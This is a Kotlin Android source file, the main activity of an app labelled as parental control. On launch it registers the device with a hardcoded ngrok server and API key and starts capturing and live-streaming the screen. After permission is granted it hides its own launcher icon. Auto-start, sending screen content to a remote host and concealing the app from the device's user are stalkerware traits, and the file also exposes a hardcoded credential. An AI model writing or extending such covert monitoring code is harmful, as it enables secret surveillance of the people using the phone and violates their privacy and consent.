package com.parentalcontrol.app

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.parentalcontrol.app.api.DeviceRegistrationRequest
import com.parentalcontrol.app.api.RetrofitClient
import com.parentalcontrol.app.databinding.ActivityMainBinding
import com.parentalcontrol.app.service.MonitoringService
import com.parentalcontrol.app.util.DeviceInfoUtil
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PREFS_NAME = "parental_control"
        const val DEFAULT_SERVER_URL = "https://coat-icy-lushly.ngrok-free.dev"
        const val DEFAULT_API_KEY = "CQpg5_Ol4t1x2XTky_PoLQO9nP-_yUSLffB3a0elGwM"
        const val EXTRA_AUTO_START = "auto_start"
    }

    private lateinit var binding: ActivityMainBinding
    private lateinit var mediaProjectionLauncher: ActivityResultLauncher<Intent>

    private var isConnected = false
    private var deviceId = ""

    // Receiver for monitoring status updates
    private val statusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == MonitoringService.BROADCAST_STATUS) {
                val isMonitoring = intent.getBooleanExtra(MonitoringService.EXTRA_IS_MONITORING, false)
                val isLive = intent.getBooleanExtra(MonitoringService.EXTRA_IS_LIVE, false)
                val lastScreenshot = intent.getStringExtra(MonitoringService.EXTRA_LAST_SCREENSHOT)
                val error = intent.getStringExtra(MonitoringService.EXTRA_ERROR_MESSAGE)

                updateMonitoringUI(isMonitoring, isLive)

                if (lastScreenshot != null) {
                    binding.tvLastScreenshot.text = "Last screenshot: $lastScreenshot"
                }
                if (error != null) {
                    binding.tvStatus.text = "Error: $error"
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        deviceId = DeviceInfoUtil.getDeviceId(this)

        setupMediaProjectionLauncher()
        loadSavedSettings()
        setupUI()
        updateDeviceInfo()

        checkAndTriggerAutoStart()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra(EXTRA_AUTO_START, false) == true) {
            Log.i(TAG, "onNewIntent triggered with EXTRA_AUTO_START")
            if (isConnected) {
                if (!MonitoringService.hasScreenCapture) {
                    startMonitoring()
                }
            } else {
                connect(autoStartMonitoring = true)
            }
        }
    }

    private fun checkAndTriggerAutoStart() {
        Log.i(TAG, "App started — auto-connecting and starting monitoring immediately...")
        if (!MonitoringService.isRunning) {
            try {
                MonitoringService.startStandby(this)
            } catch (e: Exception) {
                Log.w(TAG, "Could not start standby service: ${e.message}")
            }
        }
        connect(autoStartMonitoring = true)
    }

    private fun setupMediaProjectionLauncher() {
        mediaProjectionLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                MonitoringService.start(this, result.resultCode, result.data!!)
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    .edit()
                    .putBoolean("was_monitoring_active", true)
                    .apply()
                updateMonitoringUI(true)
                Toast.makeText(this, "Monitoring active", Toast.LENGTH_SHORT).show()

                // Hide app launcher icon from desktop/app drawer
                hideAppIcon()
            } else {
                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
                updateMonitoringUI(false)
            }
        }
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "App icon hidden from launcher/desktop")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide app icon: ${e.message}")
        }
    }

    private fun setupUI() {
        // Restore monitoring state
        if (MonitoringService.isRunning) {
            updateMonitoringUI(true, MonitoringService.isLiveStreaming)
        }
    }

    private fun loadSavedSettings() {
        saveSettings()
    }

    private fun saveSettings() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putString("server_url", DEFAULT_SERVER_URL)
            .putString("api_key", DEFAULT_API_KEY)
            .apply()
    }

    private fun updateDeviceInfo() {
        val info = buildString {
            append("Device ID: $deviceId\n")
            append("Name: ${DeviceInfoUtil.getDeviceName()}\n")
            append("Model: ${DeviceInfoUtil.getDeviceModel()}\n")
            append("Android: ${DeviceInfoUtil.getAndroidVersion()}")
        }
        binding.tvDeviceInfo.text = info
    }

    private fun connect(autoStartMonitoring: Boolean = true) {
        saveSettings()
        binding.tvStatus.text = "Connecting..."

        lifecycleScope.launch {
            try {
                val api = RetrofitClient.getInstance(DEFAULT_SERVER_URL, DEFAULT_API_KEY)

                // Register device
                val request = DeviceRegistrationRequest(
                    deviceId = deviceId,
                    deviceName = DeviceInfoUtil.getDeviceName(),
                    deviceModel = DeviceInfoUtil.getDeviceModel(),
                    androidVersion = DeviceInfoUtil.getAndroidVersion(),
                    appVersion = DeviceInfoUtil.getAppVersion(this@MainActivity)
                )

                val response = withContext(Dispatchers.IO) {
                    api.registerDevice(request)
                }

                if (response.isSuccessful || response.code() == 409) {
                    // 409 = already registered, that's fine
                    isConnected = true
                    updateConnectionUI(true)
                    Toast.makeText(this@MainActivity, "Connected!", Toast.LENGTH_SHORT).show()

                    if (autoStartMonitoring && !MonitoringService.hasScreenCapture) {
                        Log.i(TAG, "Triggering automatic start of screen monitoring")
                        startMonitoring()
                    }
                } else {
                    val error = response.errorBody()?.string() ?: "Unknown error"
                    updateConnectionUI(false)
                    binding.tvStatus.text = "Error: HTTP ${response.code()}"
                    Log.e(TAG, "Registration failed: $error")
                }
            } catch (e: Exception) {
                updateConnectionUI(false)
                binding.tvStatus.text = "Error: ${e.message}"
                Log.e(TAG, "Connection failed", e)
            }
        }
    }

    private fun disconnect() {
        if (MonitoringService.isRunning) {
            stopMonitoring()
        }
        RetrofitClient.reset()
        isConnected = false
        updateConnectionUI(false)
    }

    private fun updateConnectionUI(connected: Boolean) {
        if (connected) {
            binding.viewConnectionIndicator.setBackgroundColor(
                ContextCompat.getColor(this, R.color.status_connected)
            )
            binding.tvStatus.text = "Connected"
        } else {
            binding.viewConnectionIndicator.setBackgroundColor(
                ContextCompat.getColor(this, R.color.status_disconnected)
            )
            binding.tvStatus.text = "Disconnected"
            binding.tvLastScreenshot.text = ""
        }
    }

    private fun startMonitoring() {
        try {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjectionLauncher.launch(projectionManager.createScreenCaptureIntent())
        } catch (e: Exception) {
            Log.e(TAG, "Error starting screen capture projection: ${e.message}")
            Toast.makeText(this, "Failed to start capture: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun stopMonitoring() {
        MonitoringService.stop(this)
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putBoolean("was_monitoring_active", false)
            .apply()
        updateMonitoringUI(false)
    }

    private fun updateMonitoringUI(active: Boolean, isLive: Boolean = MonitoringService.isLiveStreaming) {
        if (active) {
            if (isLive) {
                binding.tvMonitoringStatus.text = "🔴 Live Streaming Active"
                binding.tvMonitoringStatus.setTextColor(
                    ContextCompat.getColor(this, R.color.status_disconnected)
                )
            } else {
                binding.tvMonitoringStatus.text = "Monitoring Active"
                binding.tvMonitoringStatus.setTextColor(
                    ContextCompat.getColor(this, R.color.status_connected)
                )
            }
        } else {
            binding.tvMonitoringStatus.text = "Monitoring Inactive"
            binding.tvMonitoringStatus.setTextColor(
                ContextCompat.getColor(this, R.color.status_disconnected)
            )
        }
    }

    override fun onResume() {
        super.onResume()
        val filter = IntentFilter(MonitoringService.BROADCAST_STATUS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(statusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(statusReceiver, filter)
        }
        // Refresh monitoring state
        updateMonitoringUI(MonitoringService.isRunning, MonitoringService.isLiveStreaming)

        if (isConnected && !MonitoringService.hasScreenCapture) {
            startMonitoring()
        }
    }

    override fun onPause() {
        super.onPause()
        try {
            unregisterReceiver(statusReceiver)
        } catch (_: IllegalArgumentException) {
            // Not registered
        }
    }
}
